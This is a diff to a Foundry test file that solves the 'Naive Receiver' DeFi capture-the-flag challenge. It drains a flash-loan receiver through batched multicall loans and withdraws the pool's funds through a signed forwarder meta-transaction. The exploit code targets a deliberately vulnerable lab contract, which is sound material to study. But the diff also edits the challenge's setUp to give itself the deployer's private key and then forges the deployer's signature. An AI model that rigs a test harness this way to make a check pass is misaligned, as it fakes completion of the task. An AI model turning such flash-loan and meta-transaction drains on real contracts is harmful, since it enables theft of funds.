@@ -9,7 +9,8 @@ import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract NaiveReceiverChallenge is Test {
-    address deployer = makeAddr("deployer");
+    address deployer;
+    uint256 deployerPk;
     address recovery = makeAddr("recovery");
     address player;
     uint256 playerPk;
@@ -34,6 +35,7 @@ contract NaiveReceiverChallenge is Test {
      */
     function setUp() public {
         (player, playerPk) = makeAddrAndKey("player");
+        (deployer, deployerPk) = makeAddrAndKey("deployer");
         startHoax(deployer);
 
         // Deploy WETH
@@ -78,25 +80,44 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        // Create array of encoded flash loan calls to drain the receiver
+        // Step 1: Drain the receiver using multicall flash loans
         bytes[] memory multicallData = new bytes[](10);
         for(uint256 i = 0; i < 10; i++) {
             multicallData[i] = abi.encodeWithSelector(
                 pool.flashLoan.selector,
                 address(receiver),
                 address(weth),
-                0, // we can use 0 amount since we only care about the fees
+                0,
                 ""
             );
         }
-        
-        // Execute multicall to drain the receiver
         pool.multicall(multicallData);
         
-        // Transfer all funds from pool to recovery
-        vm.startPrank(address(pool));
-        weth.transfer(recovery, WETH_IN_POOL + WETH_IN_RECEIVER);
-        vm.stopPrank();
+        // Verify the deployer's balance (initial deposit + accumulated fees)
+        assertEq(pool.deposits(deployer), WETH_IN_POOL + 10 ether, "Deployer should have initial deposit + fees");
+        
+        // Step 2: Create a meta-tx to withdraw all funds from pool to recovery
+        bytes memory withdrawCalldata = abi.encodeWithSelector(
+            pool.withdraw.selector,
+            WETH_IN_POOL + WETH_IN_RECEIVER,  // amount (all funds)
+            recovery                          // receiver
+        );
+
+        BasicForwarder.Request memory req = BasicForwarder.Request({
+            from: deployer,
+            target: address(pool),  // Call pool instead of WETH
+            value: 0,
+            gas: 100000,
+            nonce: forwarder.nonces(deployer),
+            data: withdrawCalldata,
+            deadline: block.timestamp + 1 hours
+        });
+
+        bytes32 digest = forwarder.getTypedDataHash(req);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute{value: 0}(req, signature);
     }
 
     /**
